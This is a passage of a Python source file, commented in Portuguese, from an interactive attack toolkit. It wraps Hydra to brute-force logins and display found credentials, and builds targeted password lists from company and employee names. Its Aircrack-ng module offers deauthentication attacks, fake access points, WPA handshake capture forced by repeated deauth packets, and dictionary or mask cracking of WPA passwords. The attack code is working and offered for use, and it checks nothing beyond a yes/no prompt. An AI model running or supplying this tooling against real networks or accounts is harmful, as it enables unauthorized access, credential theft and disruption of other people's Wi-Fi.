        temp_file = self._create_temp_file(users if list_type == 'users' else passwords)
        return temp_file
    
    def _generate_date_passwords(self):
        """Gerar senhas baseadas em datas"""
        passwords = []
        start_date = datetime(1970, 1, 1)
        end_date = datetime(2024, 12, 31)
        current = start_date
        
        while current <= end_date:
            # Formato DDMMYYYY
            passwords.append(current.strftime("%d%m%Y"))
            # Formato YYYYMMDD
            passwords.append(current.strftime("%Y%m%d"))
            # Formato MMDDYYYY
            passwords.append(current.strftime("%m%d%Y"))
            # Formato DDMMYY
            passwords.append(current.strftime("%d%m%y"))
            current += timedelta(days=1)
        
        return passwords[:10000]  # Limitar
    
    def _generate_from_pattern(self, pattern):
        """Gerar lista a partir de padrão"""
        # Implementação simples de padrões como "user{0..100}"
        if '{' in pattern and '}' in pattern:
            prefix = pattern.split('{')[0]
            range_part = pattern.split('{')[1].split('}')[0]
            
            if '..' in range_part:
                start, end = map(int, range_part.split('..'))
                items = [f"{prefix}{i}" for i in range(start, end + 1)]
                return self._create_temp_file(items)
        
        # Padrão não reconhecido, usar padrão simples
        print(f"{Fore.YELLOW}Padrão não reconhecido. Usando padrão simples.{Style.RESET_ALL}")
        return self._create_temp_file(['test'])
    
    def _get_output_file(self, protocol, target):
        """Obter arquivo de output"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        default_name = f"hydra_{protocol}_{target.replace('.', '_')}_{timestamp}"
        
        filename = input(f"{Fore.GREEN}Nome do arquivo de output [padrão: {default_name}.txt]: {Style.RESET_ALL}").strip()
        if not filename:
            filename = default_name
        
        output_file = Config.SESSIONS_DIR / f"{filename}.txt"
        self.session_file = output_file
        
        return str(output_file)
    
    def _build_hydra_command(self, **kwargs):
        """Construir comando Hydra"""
        cmd = ['hydra']
        
        # Usuários
        if kwargs.get('user_file'):
            cmd.extend(['-L', kwargs['user_file']])
        else:
            cmd.extend(['-l', kwargs.get('single_user', 'admin')])
        
        # Senhas
        if kwargs.get('pass_file'):
            cmd.extend(['-P', kwargs['pass_file']])
        else:
            cmd.extend(['-p', kwargs.get('single_pass', 'password')])
        
        # Performance
        cmd.extend(['-t', kwargs.get('threads', '16')])
        cmd.extend(['-w', kwargs.get('timeout', '30')])
        
        # Output
        if kwargs.get('output_file'):
            cmd.extend(['-o', kwargs['output_file']])
        
        # Opções
        if kwargs.get('verbose', True):
            cmd.append('-v')
        
        if kwargs.get('stop_on_success', False):
            cmd.append('-f')
        
        # Protocolo específico
        if kwargs['protocol'] in ['http-get', 'http-post', 'https-get', 'https-post']:
            path = input(f"{Fore.GREEN}Path (ex: /login.php): {Style.RESET_ALL}").strip()
            if path:
                cmd.extend(['-m', path])
        
        # Alvo final
        cmd.extend([kwargs['protocol'], f"{kwargs['target']}:{kwargs['port']}"])
        
        return cmd
    
    def _execute_attack(self, cmd, protocol, target):
        """Executar ataque Hydra"""
        print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}RESUMO DO ATAQUE:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"Protocolo: {protocol}")
        print(f"Alvo: {target}")
        print(f"Threads: {cmd[cmd.index('-t') + 1]}")
        print(f"Comando: {' '.join(cmd)}")
        print(f"Arquivo de saída: {self.session_file}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        
        confirm = input(f"\n{Fore.RED}Executar ataque? (s/n): {Style.RESET_ALL}").strip().lower()
        
        if confirm != 's':
            print(f"{Fore.YELLOW}Ataque cancelado.{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}Iniciando ataque Hydra...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Pressione Ctrl+C para interromper{Style.RESET_ALL}")
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Monitorar output
            found_credentials = []
            start_time = time.time()
            
            for line in iter(process.stdout.readline, ''):
                line = line.strip()
                if line:
                    self._colorize_output(line, found_credentials)
                    
                    # Verificar se encontrou credenciais
                    if '[DATA]' in line and 'host:' in line.lower():
                        found_credentials.append(line)
            
            process.wait()
            
            # Mostrar resultados
            self._show_results(process.returncode, found_credentials, start_time)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Ataque interrompido pelo usuário.{Style.RESET_ALL}")
            if process:
                process.terminate()
        except Exception as e:
            print(f"{Fore.RED}Erro durante execução: {e}{Style.RESET_ALL}")
    
    def _colorize_output(self, line, found_credentials):
        """Colorir output baseado no conteúdo"""
        if '[DATA]' in line and ('login:' in line.lower() or 'password:' in line.lower()):
            print(f"{Fore.GREEN}{line}{Style.RESET_ALL}")
            found_credentials.append(line)
        elif 'success' in line.lower():
            print(f"{Fore.GREEN}✓ {line}{Style.RESET_ALL}")
        elif 'error' in line.lower() or 'failed' in line.lower():
            print(f"{Fore.RED}✗ {line}{Style.RESET_ALL}")
        elif 'waiting' in line.lower() or 'children' in line.lower():
            print(f"{Fore.YELLOW}⏳ {line}{Style.RESET_ALL}")
        elif 'attempt' in line.lower():
            print(f"{Fore.BLUE}→ {line}{Style.RESET_ALL}")
        else:
            print(f"{Fore.WHITE}{line}{Style.RESET_ALL}")
    
    def _show_results(self, returncode, found_credentials, start_time):
        """Mostrar resultados do ataque"""
        elapsed = time.time() - start_time
        
        print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}RESULTADOS FINAIS:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        
        if returncode == 0:
            print(f"{Fore.GREEN}✓ Ataque concluído com sucesso!{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠ Ataque finalizado com código {returncode}{Style.RESET_ALL}")
        
        print(f"\nTempo total: {elapsed:.2f} segundos")
        print(f"Credenciais encontradas: {len(found_credentials)}")
        
        if found_credentials:
            print(f"\n{Fore.GREEN}CREDENCIAIS ENCONTRADAS:{Style.RESET_ALL}")
            for i, cred in enumerate(found_credentials[:10], 1):  # Mostrar apenas 10
                print(f"{i}. {cred}")
            
            if len(found_credentials) > 10:
                print(f"... e mais {len(found_credentials) - 10} credenciais")
        
        if self.session_file:
            print(f"\n{Fore.YELLOW}Resultados salvos em: {self.session_file}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
    
    def _create_temp_file(self, items):
        """Criar arquivo temporário com itens"""
        temp_file = f"/tmp/hydra_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.txt"
        with open(temp_file, 'w') as f:
            f.write('\n'.join(map(str, items)))
        return temp_file
    
    def _generate_custom_wordlist(self):
        """Gerar wordlist personalizada"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'GERADOR DE WORDLIST PERSONALIZADA':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Opções de geração:{Style.RESET_ALL}")
        print("1. Baseado em informações da empresa")
        print("2. Baseado em padrões comuns")
        print("3. Combinar múltiplas wordlists")
        print("4. Gerar a partir de um site")
        
        choice = input(f"\n{Fore.GREEN}Selecione opção [1-4]: {Style.RESET_ALL}").strip()
        
        if choice == '1':
            self._generate_company_wordlist()
        elif choice == '2':
            self._generate_pattern_wordlist()
        elif choice == '3':
            self._combine_wordlists()
        elif choice == '4':
            self._generate_from_website()
        else:
            print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _generate_company_wordlist(self):
        """Gerar wordlist baseada em informações da empresa"""
        print(f"\n{Fore.YELLOW}Informações da empresa:{Style.RESET_ALL}")
        
        company_name = input(f"{Fore.GREEN}Nome da empresa: {Style.RESET_ALL}").strip()
        industry = input(f"{Fore.GREEN}Setor/Indústria: {Style.RESET_ALL}").strip()
        keywords = input(f"{Fore.GREEN}Palavras-chave (separadas por vírgula): {Style.RESET_ALL}").strip()
        employees = input(f"{Fore.GREEN}Nomes de funcionários conhecidos (separados por vírgula): {Style.RESET_ALL}").strip()
        
        words = set()
        
        # Adicionar variações do nome da empresa
        if company_name:
            company_lower = company_name.lower()
            words.add(company_lower)
            words.add(company_lower.replace(' ', ''))
            words.add(company_lower.replace(' ', '_'))
            words.add(company_lower.replace(' ', '-'))
            words.add(company_lower.split()[0] if ' ' in company_lower else '')
        
        # Adicionar setor
        if industry:
            words.add(industry.lower())
        
        # Adicionar palavras-chave
        if keywords:
            for keyword in keywords.split(','):
                kw = keyword.strip().lower()
                if kw:
                    words.add(kw)
        
        # Adicionar funcionários
        if employees:
            for emp in employees.split(','):
                name = emp.strip().lower()
                if name:
                    words.add(name)
                    # Primeiro nome
                    if ' ' in name:
                        words.add(name.split()[0])
                    # Iniciais
                    words.add(''.join([p[0] for p in name.split() if p]))
        
        # Gerar combinações
        generated = set(words)
        
        for word in words:
            if word:
                # Adicionar números
                for i in range(10):
                    generated.add(f"{word}{i}")
                    generated.add(f"{word}{i}{i}")
                    generated.add(f"{word}{i}{i}{i}")
                
                # Adicionar anos
                for year in range(2010, 2025):
                    generated.add(f"{word}{year}")
                    generated.add(f"{year}{word}")
                
                # Adicionar caracteres especiais
                for special in ['!', '@', '#', '$', '%', '&', '*']:
                    generated.add(f"{word}{special}")
                    generated.add(f"{special}{word}")
                
                # Capitalizações
                generated.add(word.capitalize())
                generated.add(word.upper())
        
        # Adicionar padrões comuns
        common = [
            'password', 'pass', 'pass123', 'admin', 'root', 'user',
            '123456', 'qwerty', 'welcome', 'login', 'secret', 'test'
        ]
        
        generated.update(common)
        
        # Criar arquivo
        output_file = Config.WORDLISTS_DIR / f"company_{company_name.replace(' ', '_').lower()}_{datetime.now().strftime('%Y%m%d')}.txt"
        
        with open(output_file, 'w') as f:
            for word in sorted(generated):
                if word:  # Ignorar strings vazias
                    f.write(f"{word}\n")
        
        print(f"\n{Fore.GREEN}✓ Wordlist criada com {len(generated)} entradas")
        print(f"  Arquivo: {output_file}{Style.RESET_ALL}")
        
        return str(output_file)

# ============================================================================
# SISTEMA AIRCRACK-NG COMPLETO
# ============================================================================

class CompleteAircrackSuite:
    """Suite completa do Aircrack-ng com todas as ferramentas"""
    
    def __init__(self):
        self.logger = logging.getLogger('AircrackSuite')
        self.interface = None
        self.monitor_interface = None
        self.current_channel = None
        self.capture_file = None
        
        # Criar diretórios necessários
        Config.CAPTURES_DIR.mkdir(exist_ok=True)
    
    def main_menu(self):
        """Menu principal da suite Aircrack"""
        while True:
            self._show_banner()
            
            print(f"{Fore.YELLOW}Menu Principal:{Style.RESET_ALL}")
            print("1.  Configurar interface WiFi")
            print("2.  Scan de redes WiFi")
            print("3.  Capturar handshake WPA/WPA2")
            print("4.  Quebrar senha WPA/WPA2")
            print("5.  Ataque WEP")
            print("6.  Ataque deauthentication")
            print("7.  Criação de ponto de acesso falso")
            print("8.  Injeção de pacotes")
            print("9.  Monitorar tráfego WiFi")
            print("10. Análise de pacotes WiFi")
            print("11. Teste de cobertura WiFi")
            print("12. Ferramentas avançadas")
            print("13. Voltar ao menu principal")
            
            choice = input(f"\n{Fore.GREEN}Selecione opção [1-13]: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.setup_wifi_interface()
            elif choice == '2':
                self.scan_wifi_networks()
            elif choice == '3':
                self.capture_wpa_handshake()
            elif choice == '4':
                self.crack_wpa_password()
            elif choice == '5':
                self.attack_wep()
            elif choice == '6':
                self.deauth_attack()
            elif choice == '7':
                self.create_fake_ap()
            elif choice == '8':
                self.packet_injection()
            elif choice == '9':
                self.monitor_wifi_traffic()
            elif choice == '10':
                self.analyze_wifi_packets()
            elif choice == '11':
                self.wifi_coverage_test()
            elif choice == '12':
                self.advanced_tools()
            elif choice == '13':
                break
            else:
                print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
    
    def _show_banner(self):
        """Mostrar banner da suite"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'AIRCRACK-NG COMPLETE SUITE':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        if self.monitor_interface:
            print(f"{Fore.GREEN}Interface monitor: {self.monitor_interface}{Style.RESET_ALL}")
        elif self.interface:
            print(f"{Fore.YELLOW}Interface: {self.interface} (modo monitor não ativo){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Nenhuma interface configurada{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")
    
    def setup_wifi_interface(self):
        """Configurar interface WiFi para monitoramento"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'CONFIGURAÇÃO DE INTERFACE WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        # Listar interfaces disponíveis
        interfaces = self._list_wifi_interfaces()
        
        if not interfaces:
            print(f"{Fore.RED}Nenhuma interface WiFi encontrada!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Certifique-se de que:")
            print("1. Você tem uma interface WiFi compatível")
            print("2. O driver está instalado corretamente")
            print("3. Você tem permissões de root/sudo{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.YELLOW}Interfaces WiFi disponíveis:{Style.RESET_ALL}")
        for i, iface in enumerate(interfaces, 1):
            print(f"{i}. {iface}")
        
        while True:
            try:
                choice = input(f"\n{Fore.GREEN}Selecione interface [1-{len(interfaces)}]: {Style.RESET_ALL}")
                if choice.isdigit():
                    idx = int(choice) - 1
                    if 0 <= idx < len(interfaces):
                        self.interface = interfaces[idx]
                        break
            except:
                pass
            print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
        
        # Configurar modo monitor
        print(f"\n{Fore.YELLOW}Configurando modo monitor...{Style.RESET_ALL}")
        success = self._enable_monitor_mode()
        
        if success:
            print(f"{Fore.GREEN}✓ Modo monitor ativado em {self.monitor_interface}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}✗ Falha ao ativar modo monitor{Style.RESET_ALL}")
    
    def _list_wifi_interfaces(self):
        """Listar interfaces WiFi disponíveis"""
        try:
            result = subprocess.run(
                ['iwconfig'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'IEEE' in line or 'ESSID' in line or 'no wireless' in line:
                    iface = line.split()[0]
                    if iface and iface not in interfaces:
                        interfaces.append(iface)
            
            return interfaces
            
        except Exception as e:
            self.logger.error(f"Erro ao listar interfaces: {e}")
            return []
    
    def _enable_monitor_mode(self):
        """Ativar modo monitor na interface"""
        try:
            # Parar processos que podem interferir
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         capture_output=True, timeout=30)
            
            # Iniciar modo monitor
            result = subprocess.run(
                ['airmon-ng', 'start', self.interface],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            # Extrair nome da interface monitor
            for line in result.stdout.split('\n'):
                if 'monitor mode enabled' in line.lower():
                    parts = line.split()
                    for part in parts:
                        if 'mon' in part and self.interface in part:
                            self.monitor_interface = part
                            return True
            
            # Tentar método alternativo
            result = subprocess.run(
                ['iw', 'dev', self.interface, 'interface', 'add', f'{self.interface}mon', 'type', 'monitor'],
                capture_output=True,
                timeout=30
            )
            
            if result.returncode == 0:
                self.monitor_interface = f'{self.interface}mon'
                
                # Ativar interface
                subprocess.run(['ifconfig', self.monitor_interface, 'up'], 
                             capture_output=True, timeout=10)
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Erro ao ativar modo monitor: {e}")
            return False
    
    def scan_wifi_networks(self):
        """Escaneamento avançado de redes WiFi"""
        if not self.monitor_interface:
            print(f"{Fore.RED}Interface monitor não configurada!{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'ESCANEAMENTO DE REDES WIFI':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Opções de scan:{Style.RESET_ALL}")
        print("1. Scan rápido")
        print("2. Scan detalhado (5-10 minutos)")
        print("3. Scan direcionado por canal")
        print("4. Scan com desautenticação")
        
        choice = input(f"\n{Fore.GREEN}Selecione tipo de scan [1-4]: {Style.RESET_ALL}").strip()
        
        duration = 10  # segundos padrão
        channels = None
        
        if choice == '2':
            duration = 300  # 5 minutos
        elif choice == '3':
            channel_input = input(f"{Fore.GREEN}Canais (ex: 1,6,11 ou 1-14): {Style.RESET_ALL}").strip()
            channels = self._parse_channels(channel_input)
        elif choice == '4':
            duration = 30
            deauth_enabled = True
        else:
            deauth_enabled = False
        
        # Executar scan com airodump-ng
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = Config.CAPTURES_DIR / f"scan_{timestamp}"
        
        cmd = ['airodump-ng', self.monitor_interface, '-w', str(output_file), '--output-format', 'csv']
        
        if channels:
            cmd.extend(['-c', ','.join(map(str, channels))])
        
        print(f"\n{Fore.YELLOW}Iniciando scan... Pressione Ctrl+C para interromper{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Duração: {duration} segundos{Style.RESET_ALL}")
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Timer para parar automaticamente
            def stop_scan():
                sleep(duration)
                if process.poll() is None:
                    process.terminate()
            
            timer_thread = threading.Thread(target=stop_scan)
            timer_thread.daemon = True
            timer_thread.start()
            
            # Exibir progresso
            start_time = time.time()
            networks = []
            
            while process.poll() is None:
                try:
                    line = process.stdout.readline()
                    if line:
                        network = self._parse_airodump_line(line)
                        if network:
                            networks.append(network)
                            self._display_network(network)
                    
                    # Atualizar display a cada segundo
                    elapsed = time.time() - start_time
                    if elapsed >= 1:
                        print(f"\r{Fore.CYAN}Tempo: {int(elapsed)}s | Redes encontradas: {len(networks)}", end='')
                        start_time = time.time()
                        
                except KeyboardInterrupt:
                    process.terminate()
                    break
            
            process.wait()
            
            # Analisar resultados
            self._analyze_scan_results(output_file)
            
        except Exception as e:
            print(f"{Fore.RED}Erro durante scan: {e}{Style.RESET_ALL}")
    
    def _parse_channels(self, channel_input):
        """Analisar string de canais"""
        channels = []
        
        try:
            if '-' in channel_input:
                start, end = map(int, channel_input.split('-'))
                channels = list(range(start, end + 1))
            elif ',' in channel_input:
                channels = [int(c.strip()) for c in channel_input.split(',')]
            else:
                channels = [int(channel_input)]
        except:
            print(f"{Fore.YELLOW}Formato inválido. Usando todos os canais.{Style.RESET_ALL}")
        
        return channels
    
    def _parse_airodump_line(self, line):
        """Analisar linha do airodump-ng"""
        if not line.strip() or 'BSSID' in line or 'Station' in line:
            return None
        
        parts = line.split(',')
        if len(parts) >= 14:
            try:
                network = {
                    'bssid': parts[0].strip(),
                    'essid': parts[13].strip().strip('"'),
                    'channel': parts[3].strip(),
                    'encryption': parts[5].strip(),
                    'power': parts[8].strip(),
                    'beacons': parts[9].strip(),
                    'iv': parts[10].strip(),
                    'clients': []
                }
                return network
            except:
                pass
        
        return None
    
    def _display_network(self, network):
        """Exibir informação da rede"""
        color = Fore.GREEN if 'WPA2' in network['encryption'] else Fore.YELLOW if 'WPA' in network['encryption'] else Fore.RED
        enc = network['encryption'] if network['encryption'] else 'OPEN'
        
        print(f"\n{color}BSSID: {network['bssid']}")
        print(f"ESSID: {network['essid']}")
        print(f"Canal: {network['channel']} | Sinal: {network['power']}dB")
        print(f"Encryption: {enc}{Style.RESET_ALL}")
    
    def _analyze_scan_results(self, output_file):
        """Analisar resultados do scan"""
        csv_file = f"{output_file}.csv"
        
        if not os.path.exists(csv_file):
            print(f"{Fore.RED}Arquivo de resultados não encontrado!{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'ANÁLISE DOS RESULTADOS':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            networks = []
            parsing_networks = True
            
            for line in lines:
                if 'Station MAC' in line:
                    parsing_networks = False
                    continue
                
                if parsing_networks and line.strip() and not line.startswith('BSSID'):
                    parts = line.split(',')
                    if len(parts) >= 14:
                        network = {
                            'bssid': parts[0].strip(),
                            'essid': parts[13].strip().strip('"'),
                            'channel': parts[3].strip(),
                            'encryption': parts[5].strip(),
                            'power': int(parts[8].strip()) if parts[8].strip().isdigit() else -100,
                            'clients': 0
                        }
                        networks.append(network)
            
            # Estatísticas
            print(f"\n{Fore.YELLOW}ESTATÍSTICAS:{Style.RESET_ALL}")
            print(f"Total de redes: {len(networks)}")
            
            # Contar por tipo de encriptação
            enc_types = Counter([n['encryption'] for n in networks if n['encryption']])
            for enc, count in enc_types.items():
                print(f"  {enc}: {count}")
            
            # Redes mais fortes
            if networks:
                networks.sort(key=lambda x: x['power'], reverse=True)
                
                print(f"\n{Fore.YELLOW}REDES MAIS FORTES:{Style.RESET_ALL}")
                for i, net in enumerate(networks[:5], 1):
                    color = Fore.GREEN if net['power'] > -50 else Fore.YELLOW if net['power'] > -70 else Fore.RED
                    print(f"{i}. {color}{net['essid']} ({net['bssid']})")
                    print(f"   Canal: {net['channel']} | Sinal: {net['power']}dB | {net['encryption']}{Style.RESET_ALL}")
            
            # Salvar em JSON para análise posterior
            json_file = f"{output_file}.json"
            with open(json_file, 'w') as f:
                json.dump(networks, f, indent=2)
            
            print(f"\n{Fore.GREEN}Resultados salvos em:{Style.RESET_ALL}")
            print(f"  CSV: {csv_file}")
            print(f"  JSON: {json_file}")
            
        except Exception as e:
            print(f"{Fore.RED}Erro na análise: {e}{Style.RESET_ALL}")
    
    def capture_wpa_handshake(self):
        """Capturar handshake WPA/WPA2"""
        if not self.monitor_interface:
            print(f"{Fore.RED}Interface monitor não configurada!{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'CAPTURA DE HANDSHAKE WPA/WPA2':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        # Obter informações da rede alvo
        print(f"\n{Fore.YELLOW}Informações da rede alvo:{Style.RESET_ALL}")
        
        bssid = input(f"{Fore.GREEN}BSSID (MAC do AP): {Style.RESET_ALL}").strip().upper()
        essid = input(f"{Fore.GREEN}ESSID (nome da rede): {Style.RESET_ALL}").strip()
        channel = input(f"{Fore.GREEN}Canal: {Style.RESET_ALL}").strip()
        
        if not bssid or not essid or not channel:
            print(f"{Fore.RED}Todas as informações são obrigatórias!{Style.RESET_ALL}")
            return
        
        # Nome do arquivo de captura
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        capture_file = Config.CAPTURES_DIR / f"handshake_{essid.replace(' ', '_')}_{timestamp}"
        
        print(f"\n{Fore.YELLOW}Opções de captura:{Style.RESET_ALL}")
        print("1. Captura passiva (esperar handshake natural)")
        print("2. Captura ativa (forçar desautenticação)")
        print("3. Captura com cliente específico")
        
        choice = input(f"\n{Fore.GREEN}Selecione método [1-3]: {Style.RESET_ALL}").strip()
        
        # Iniciar airodump-ng para capturar handshake
        print(f"\n{Fore.YELLOW}Iniciando captura...{Style.RESET_ALL}")
        
        cmd_airodump = [
            'airodump-ng',
            '--bssid', bssid,
            '-c', channel,
            '-w', str(capture_file),
            '--output-format', 'pcap',
            self.monitor_interface
        ]
        
        # Thread para desautenticação se necessário
        deauth_thread = None
        
        if choice in ['2', '3']:
            client_mac = None
            if choice == '3':
                client_mac = input(f"{Fore.GREEN}MAC do cliente (opcional): {Style.RESET_ALL}").strip().upper()
            
            # Função para desautenticação
            def deauth_attack():
                cmd_deauth = ['aireplay-ng', '--deauth', '10', '-a', bssid]
                if client_mac:
                    cmd_deauth.extend(['-c', client_mac])
                cmd_deauth.append(self.monitor_interface)
                
                for _ in range(3):  # 3 ciclos de desautenticação
                    subprocess.run(cmd_deauth, capture_output=True, timeout=30)
                    sleep(10)
            
            deauth_thread = threading.Thread(target=deauth_attack)
            deauth_thread.daemon = True
            deauth_thread.start()
        
        # Iniciar captura
        try:
            process = subprocess.Popen(
                cmd_airodump,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            print(f"\n{Fore.CYAN}Monitorando handshake... Pressione Ctrl+C quando capturar{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Arquivo: {capture_file}.cap{Style.RESET_ALL}")
            
            handshake_captured = False
            start_time = time.time()
            
            while process.poll() is None:
                try:
                    line = process.stderr.readline()
                    if line and 'WPA handshake' in line:
                        handshake_captured = True
                        print(f"\n{Fore.GREEN}✓ HANDSHAKE CAPTURADO!{Style.RESET_ALL}")
                        process.terminate()
                        break
                    
                    # Timeout após 5 minutos
                    if time.time() - start_time > 300:
                        print(f"\n{Fore.YELLOW}⚠ Timeout - Nenhum handshake capturado{Style.RESET_ALL}")
                        process.terminate()
                        break
                    
                    print(f"\r{Fore.CYAN}Tempo: {int(time.time() - start_time)}s", end='')
                    
                except KeyboardInterrupt:
                    print(f"\n{Fore.YELLOW}Captura interrompida{Style.RESET_ALL}")
                    process.terminate()
                    break
            
            process.wait()
            
            # Verificar se handshake foi capturado
            if handshake_captured:
                self.capture_file = f"{capture_file}.cap"
                self._verify_handshake(self.capture_file, bssid)
            else:
                print(f"{Fore.RED}Nenhum handshake foi capturado{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}Erro durante captura: {e}{Style.RESET_ALL}")
    
    def _verify_handshake(self, capture_file, bssid):
        """Verificar se handshake é válido"""
        print(f"\n{Fore.YELLOW}Verificando handshake...{Style.RESET_ALL}")
        
        try:
            result = subprocess.run(
                ['aircrack-ng', capture_file, '-b', bssid],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if '1 handshake' in result.stdout:
                print(f"{Fore.GREEN}✓ Handshake WPA válido confirmado!{Style.RESET_ALL}")
                print(f"\n{Fore.CYAN}Próximo passo: Use a opção 4 para quebrar a senha{Style.RESET_ALL}")
                return True
            else:
                print(f"{Fore.RED}✗ Handshake inválido ou não encontrado{Style.RESET_ALL}")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}Erro na verificação: {e}{Style.RESET_ALL}")
            return False
    
    def crack_wpa_password(self):
        """Quebrar senha WPA/WPA2"""
        if not self.capture_file:
            print(f"\n{Fore.YELLOW}Nenhum arquivo de captura selecionado.{Style.RESET_ALL}")
            
            # Procurar arquivos de captura
            cap_files = list(Config.CAPTURES_DIR.glob("*.cap"))
            
            if not cap_files:
                print(f"{Fore.RED}Nenhum arquivo .cap encontrado!{Style.RESET_ALL}")
                return
            
            print(f"\n{Fore.YELLOW}Arquivos de captura disponíveis:{Style.RESET_ALL}")
            for i, cap_file in enumerate(cap_files[:10], 1):
                print(f"{i}. {cap_file.name}")
            
            choice = input(f"\n{Fore.GREEN}Selecione arquivo [1-{len(cap_files[:10])}] ou caminho completo: {Style.RESET_ALL}").strip()
            
            if choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(cap_files):
                    self.capture_file = str(cap_files[idx])
            else:
                if os.path.exists(choice):
                    self.capture_file = choice
                else:
                    print(f"{Fore.RED}Arquivo não encontrado!{Style.RESET_ALL}")
                    return
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'QUEBRA DE SENHA WPA/WPA2':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Arquivo de captura: {self.capture_file}{Style.RESET_ALL}")
        
        # Obter BSSID
        bssid = input(f"{Fore.GREEN}BSSID do AP: {Style.RESET_ALL}").strip().upper()
        if not bssid:
            print(f"{Fore.YELLOW}Tentando extrair BSSID do arquivo...{Style.RESET_ALL}")
            bssid = self._extract_bssid_from_cap(self.capture_file)
        
        print(f"\n{Fore.YELLOW}Métodos de ataque:{Style.RESET_ALL}")
        print("1. Ataque de dicionário (rockyou.txt)")
        print("2. Ataque de dicionário personalizado")
        print("3. Ataque por máscara (hashcat)")
        print("4. Ataque híbrido")
        print("5. Ataque por regras")
        
        method = input(f"\n{Fore.GREEN}Selecione método [1-5]: {Style.RESET_ALL}").strip()
        
        wordlist = None
        mask = None
        rules = None
        
        if method == '1':
            wordlist = Config.DEFAULT_WORDLISTS['rockyou']
            if not os.path.exists(wordlist):
                print(f"{Fore.RED}rockyou.txt não encontrado!{Style.RESET_ALL}")
                return
        elif method == '2':
            wordlist = input(f"{Fore.GREEN}Caminho da wordlist: {Style.RESET_ALL}").strip()
            if not os.path.exists(wordlist):
                print(f"{Fore.RED}Wordlist não encontrada!{Style.RESET_ALL}")
                return
        elif method == '3':
            mask = input(f"{Fore.GREEN}Máscara (ex: ?l?l?l?l?d?d?d?d): {Style.RESET_ALL}").strip()
            if not mask:
                mask = '?l?l?l?l?d?d?d?d'
        elif method == '4':
            wordlist = input(f"{Fore.GREEN}Caminho da wordlist base: {Style.RESET_ALL}").strip()
            mask = input(f"{Fore.GREEN}Máscara para append: {Style.RESET_ALL}").strip()
        elif method == '5':
            wordlist = input(f"{Fore.GREEN}Caminho da wordlist: {Style.RESET_ALL}").strip()
            rules = input(f"{Fore.GREEN}Arquivo de regras (opcional): {Style.RESET_ALL}").strip()
        
        # Iniciar ataque
        print(f"\n{Fore.YELLOW}Iniciando quebra de senha...{Style.RESET_ALL}")
        
        if method in ['1', '2', '5']:
            self._dictionary_attack(bssid, wordlist, rules)
        elif method == '3':
            self._mask_attack(bssid, mask)
        elif method == '4':
            self._hybrid_attack(bssid, wordlist, mask)
    
    def _dictionary_attack(self, bssid, wordlist, rules=None):
        """Ataque por dicionário"""
        cmd = ['aircrack-ng', '-w', wordlist, '-b', bssid, self.capture_file]
        
        if rules:
            cmd.extend(['-r', rules])
        
        print(f"\n{Fore.CYAN}Comando: {' '.join(cmd)}{Style.RESET_ALL}")
